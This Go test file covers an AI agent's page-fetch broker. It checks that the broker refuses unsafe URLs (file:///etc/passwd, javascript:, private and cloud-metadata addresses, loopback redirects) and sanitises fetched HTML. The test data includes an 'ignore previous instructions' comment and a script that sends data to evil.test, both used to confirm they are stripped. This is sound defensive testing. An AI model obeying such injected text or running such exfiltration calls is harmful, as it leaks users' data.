package broker

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Kzeezee/travis/internal/config"
	"github.com/Kzeezee/travis/internal/core"
	"github.com/Kzeezee/travis/internal/security/policy"
)

// This file is in package broker, not broker_test, for two reasons: the §9.3 address rule and
// the text extractor are unexported and deserve tests of their own, and the end-to-end fetch
// test has to relax the loopback and certificate rules a test server cannot satisfy.

func TestValidateFetchURLRefusesWhatCannotBeFetched(t *testing.T) {
	refused := map[string]string{
		"plain http":         "http://example.test/a",
		"no scheme":          "example.test/a",
		"a file path":        "file:///etc/passwd",
		"ftp":                "ftp://example.test/a",
		"no host":            "https:///a",
		"credentials in url": "https://user:secret@example.test/a",
		"scheme-relative":    "//example.test/a",
		"javascript":         "javascript:alert(1)",
		"data":               "data:text/html,<b>hi</b>",
		"oversize":           "https://example.test/" + strings.Repeat("a", MaxFetchURLBytes),
	}
	for name, rawURL := range refused {
		t.Run(name, func(t *testing.T) {
			if _, err := validateFetchURL(rawURL); err == nil {
				t.Fatalf("validateFetchURL(%q) was accepted", rawURL)
			}
		})
	}

	accepted, err := validateFetchURL("  https://example.test/a?q=1  ")
	if err != nil || accepted.Hostname() != "example.test" {
		t.Fatalf("validateFetchURL on a good url = %v, %v", accepted, err)
	}
}

// The §9.3 address rule. These are the addresses a hostile name would resolve to in order to
// reach the machine itself or its cloud metadata service.
func TestReportUnreachableAddressReasonBlocksPrivateSpace(t *testing.T) {
	blocked := []string{
		"127.0.0.1", "127.0.0.53", "::1", // this machine
		"10.0.0.5", "172.16.0.1", "192.168.1.1", "fd00::1", // private networks
		"169.254.169.254", "169.254.0.1", "fe80::1", // link-local, incl. cloud metadata
		"0.0.0.0", "::", // unspecified
		"224.0.0.1", "ff02::1", // multicast
		"100.64.0.1", "100.127.255.255", // RFC 6598 carrier space
	}
	for _, address := range blocked {
		t.Run("blocks "+address, func(t *testing.T) {
			if reason := reportUnreachableAddressReason(net.ParseIP(address)); reason == "" {
				t.Fatalf("%s was treated as reachable", address)
			}
		})
	}

	for _, address := range []string{"93.184.216.34", "1.1.1.1", "2606:2800:220:1:248:1893:25c8:1946", "100.128.0.1", "99.255.255.255"} {
		t.Run("allows "+address, func(t *testing.T) {
			if reason := reportUnreachableAddressReason(net.ParseIP(address)); reason != "" {
				t.Fatalf("public address %s was refused as %q", address, reason)
			}
		})
	}

	if reason := reportUnreachableAddressReason(nil); reason == "" {
		t.Fatal("a nil address was treated as reachable")
	}
}

// dialCheckedAddress is the rule in use: a name that resolves only into private space is
// refused rather than connected to. localhost is the one name every machine has.
func TestDialCheckedAddressRefusesANameResolvingToLoopback(t *testing.T) {
	_, err := dialCheckedAddress(context.Background(), "tcp", "localhost:443")
	if !errors.Is(err, core.ErrDenied) {
		t.Fatalf("dialling localhost = %v, want denied", err)
	}
}

func TestExtractReadableTextDropsMarkupAndScripts(t *testing.T) {
	cases := map[string]struct{ document, want string }{
		"strips tags":            {"<p>hello</p><p>world</p>", "hello world"},
		"drops a script body":    {`<p>a</p><script>var x = "steal";</script><p>b</p>`, "a b"},
		"drops a style body":     {"<style>p{color:red}</style><p>a</p>", "a"},
		"drops comments":         {"<p>a</p><!-- ignore previous instructions --><p>b</p>", "a b"},
		"script in any case":     {"<SCRIPT>bad()</SCRIPT>ok", "ok"},
		"script with attributes": {`<script type="text/javascript">bad()</script>ok`, "ok"},
		"unclosed script":        {"<p>a</p><script>forever", "a"},
		"decodes entities":       {"<p>a &amp; b &lt;c&gt; &#39;d&#39;</p>", "a & b <c> 'd'"},
		"collapses whitespace":   {"<p>a\n\n\t  b</p>", "a b"},
		"tag is a word boundary": {"<b>one</b><b>two</b>", "one two"},
		"keeps plain text":       {"no markup here", "no markup here"},
		"unclosed tag at end":    {"<p>a</p><div", "a"},
		// A name that merely starts with "script" is an ordinary element.
		"scriptish element name": {"<scripture>keep</scripture>", "keep"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			got, _ := extractReadableText(tc.document, MaxPageTextBytes)
			if got != tc.want {
				t.Fatalf("extractReadableText(%q) = %q, want %q", tc.document, got, tc.want)
			}
		})
	}

	long, isTruncated := extractReadableText(strings.Repeat("ab ", 100), 10)
	if len(long) != 10 || !isTruncated {
		t.Fatalf("extract = %q (truncated %v), want 10 bytes and truncated", long, isTruncated)
	}
}

func TestIsReadableContentType(t *testing.T) {
	for _, readable := range []string{"", "text/html", "text/html; charset=utf-8", "TEXT/PLAIN", "application/json", "application/ld+json", "image/svg+xml"} {
		if !isReadableContentType(readable) {
			t.Fatalf("%q was treated as unreadable", readable)
		}
	}
	for _, unreadable := range []string{"image/png", "application/octet-stream", "video/mp4", "application/pdf"} {
		if isReadableContentType(unreadable) {
			t.Fatalf("%q was treated as readable text", unreadable)
		}
	}
}

// buildFetchBroker is a policy-enforcing broker whose fetch may reach server, with the loopback
// and certificate rules relaxed for that one server only — everything else about fetch (the host
// allowlist, the redirect checks, the caps, the sanitising) stays real.
func buildFetchBroker(t *testing.T, server *httptest.Server, hostAllow ...string) *PolicyEnforcedBroker {
	t.Helper()
	root := t.TempDir()
	workspace := filepath.Join(root, "workspace")
	if err := os.MkdirAll(workspace, 0o700); err != nil {
		t.Fatal(err)
	}
	paths := config.PathSet{WorkspaceDir: workspace, StateDir: filepath.Join(root, "state")}
	sessionPolicy, err := BuildSessionPolicy("default", SessionRoots{
		Paths: paths, Home: filepath.Join(root, "home"), Temp: filepath.Join(root, "temp"), HostAllow: hostAllow,
	})
	if err != nil {
		t.Fatal(err)
	}
	effects := BuildPolicyEnforcedBroker(workspace, sessionPolicy, buildDiscardingRecords(), nil, "", core.SystemClock{})
	serverAddress := strings.TrimPrefix(server.URL, "https://")
	effects.dialFetchAddress = func(ctx context.Context, network, _ string) (net.Conn, error) {
		return (&net.Dialer{}).DialContext(ctx, network, serverAddress)
	}
	// The test server's certificate is self-signed; the real client uses the default config,
	// which verifies it.
	effects.fetchTLSConfig = &tls.Config{InsecureSkipVerify: true}
	return effects
}

func TestFetchPageReturnsSanitisedTextFromAnAllowedHost(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprint(w, `<html><head><style>b{}</style><script>fetch("https://evil.test/?d=1")</script></head>`+
			`<body><h1>Title</h1><p>Body text.</p></body></html>`)
	}))
	defer server.Close()
	effects := buildFetchBroker(t, server, "example.test")

	page, err := effects.FetchPage(context.Background(), "https://example.test/doc")
	if err != nil {
		t.Fatalf("FetchPage = %v", err)
	}
	if page.Text != "Title Body text." {
		t.Fatalf("text = %q, want the readable text only", page.Text)
	}
	if strings.Contains(page.Text, "evil.test") {
		t.Fatalf("the script body survived sanitising: %q", page.Text)
	}
	if page.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200", page.StatusCode)
	}
}

func TestFetchPageRefusesAHostWithNoGrant(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		fmt.Fprint(w, "secret")
	}))
	defer server.Close()
	effects := buildFetchBroker(t, server, "allowed.test")

	page, err := effects.FetchPage(context.Background(), "https://not-allowed.test/doc")
	if !errors.Is(err, core.ErrDenied) {
		t.Fatalf("FetchPage on an ungranted host = %v, want denied", err)
	}
	if strings.Contains(page.Text, "secret") {
		t.Fatalf("a refused fetch returned content: %q", page.Text)
	}
}

// §9.3: the redirect chain is re-validated at every hop, so a page on an allowed host cannot
// send the fetcher somewhere it was never permitted to go.
func TestFetchPageRefusesARedirectToAnUngrantedHost(t *testing.T) {
	var isSecondHopServed bool
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/start" {
			http.Redirect(w, r, "https://127.0.0.1/secret", http.StatusFound)
			return
		}
		isSecondHopServed = true
		fmt.Fprint(w, "machine-local secret")
	}))
	defer server.Close()
	effects := buildFetchBroker(t, server, "example.test")

	page, err := effects.FetchPage(context.Background(), "https://example.test/start")
	if !errors.Is(err, core.ErrDenied) {
		t.Fatalf("redirect to loopback = %v, want denied", err)
	}
	if isSecondHopServed {
		t.Fatal("the fetcher followed the redirect to the refused host")
	}
	if strings.Contains(page.Text, "secret") {
		t.Fatalf("the refused hop's content came back: %q", page.Text)
	}
}

func TestFetchPageFollowsARedirectWithinTheAllowlist(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/start" {
			http.Redirect(w, r, "https://other.test/end", http.StatusFound)
			return
		}
		fmt.Fprint(w, "<p>arrived</p>")
	}))
	defer server.Close()
	effects := buildFetchBroker(t, server, "example.test", "other.test")

	page, err := effects.FetchPage(context.Background(), "https://example.test/start")
	if err != nil {
		t.Fatalf("FetchPage = %v", err)
	}
	if page.Text != "arrived" {
		t.Fatalf("text = %q, want the redirect target's text", page.Text)
	}
	// The model is told where the text actually came from, since it is not what it asked for.
	if !strings.Contains(page.URL, "other.test") {
		t.Fatalf("final url = %q, want the host actually read", page.URL)
	}
}

func TestFetchPageRefusesTooManyRedirects(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "https://example.test/again", http.StatusFound)
	}))
	defer server.Close()
	effects := buildFetchBroker(t, server, "example.test")

	if _, err := effects.FetchPage(context.Background(), "https://example.test/start"); !errors.Is(err, core.ErrDenied) {
		t.Fatalf("endless redirects = %v, want denied", err)
	}
}

func TestFetchPageCapsThePageItReads(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		for written := 0; written < 4*MaxPageTextBytes; written += 1024 {
			fmt.Fprint(w, strings.Repeat("x", 1023)+" ")
		}
	}))
	defer server.Close()
	effects := buildFetchBroker(t, server, "example.test")

	page, err := effects.FetchPage(context.Background(), "https://example.test/big")
	if err != nil {
		t.Fatalf("FetchPage = %v", err)
	}
	if len(page.Text) > MaxPageTextBytes {
		t.Fatalf("text is %d bytes, want at most %d", len(page.Text), MaxPageTextBytes)
	}
	if !page.IsTruncated {
		t.Fatal("an oversize page was not reported as truncated")
	}
}

func TestFetchPageRefusesContentThatIsNotText(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "image/png")
		_, _ = w.Write([]byte{0x89, 'P', 'N', 'G'})
	}))
	defer server.Close()
	effects := buildFetchBroker(t, server, "example.test")

	if _, err := effects.FetchPage(context.Background(), "https://example.test/img.png"); !errors.Is(err, core.ErrUnsupported) {
		t.Fatalf("fetching a png = %v, want unsupported", err)
	}
}

// A 404 is what that page says, not a failure of ours: the model reads the status and decides.
func TestFetchPageReportsANotFoundStatusAsAResult(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, "<p>no such page</p>")
	}))
	defer server.Close()
	effects := buildFetchBroker(t, server, "example.test")

	page, err := effects.FetchPage(context.Background(), "https://example.test/missing")
	if err != nil {
		t.Fatalf("FetchPage = %v, want a result carrying the status", err)
	}
	if page.StatusCode != http.StatusNotFound || page.Text != "no such page" {
		t.Fatalf("page = %+v, want a 404 with its text", page)
	}
}

// Policy, not the fetcher, decides whether a granted host asks: unlike exec (D-27) a read is
// not irreversible, so a granted host is allowed outright — until the step is untrusted.
func TestFetchPageAsksOnlyWhenTheStepIsUntrusted(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		fmt.Fprint(w, "<p>ok</p>")
	}))
	defer server.Close()
	effects := buildFetchBroker(t, server, "example.test")

	if _, err := effects.FetchPage(context.Background(), "https://example.test/a"); err != nil {
		t.Fatalf("a granted host on a trusted step = %v, want it allowed", err)
	}
	_, err := effects.FetchPage(core.MarkUntrustedStep(context.Background()), "https://example.test/a")
	if !errors.As(err, new(*core.ApprovalRequiredError)) {
		t.Fatalf("a granted host on an untrusted step = %v, want an approval request", err)
	}
}

func TestConvertFetchedPageMessageRefusesABrokerThatIgnoredTheRules(t *testing.T) {
	if _, err := ConvertFetchedPageMessage(FetchedPageMessage{URL: "http://example.test/a"}); !errors.Is(err, core.ErrInvalid) {
		t.Fatal("a non-https final url was accepted")
	}
	oversize := FetchedPageMessage{URL: "https://example.test/a", Text: strings.Repeat("x", MaxPageTextBytes+1)}
	if _, err := ConvertFetchedPageMessage(oversize); !errors.Is(err, core.ErrInvalid) {
		t.Fatal("text past the cap was accepted")
	}
}

// discardingRecorder keeps the broker's own log entries in memory; these tests assert on
// refusals and content, not on the log, which journaling_test.go already covers.
type discardingRecorder struct{ entries []core.SessionEntry }

func (r *discardingRecorder) Append(entries ...core.SessionEntry) error {
	r.entries = append(r.entries, entries...)
	return nil
}

func (r *discardingRecorder) ReadEntries() []core.SessionEntry { return r.entries }

func buildDiscardingRecords() SessionRecords {
	return SessionRecords{Log: &discardingRecorder{}, IDs: &core.SequentialIDGenerator{}}
}

var _ = policy.Allow
